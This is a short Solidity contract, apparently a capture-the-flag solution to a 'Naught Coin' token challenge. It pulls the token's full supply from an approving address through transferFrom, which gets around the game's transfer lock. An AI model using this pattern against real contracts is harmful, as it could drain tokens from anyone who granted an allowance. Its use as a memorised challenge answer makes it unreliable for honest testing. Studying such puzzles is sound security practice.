// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract NaughtSolver {

    IERC20 token;

    // Prior to calling solve the player needs to approve the contract to spend the token.totalSupply()
    function solve(address from, address t) external {
        token = IERC20(t);
        token.transferFrom(from, address(this), token.totalSupply());
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}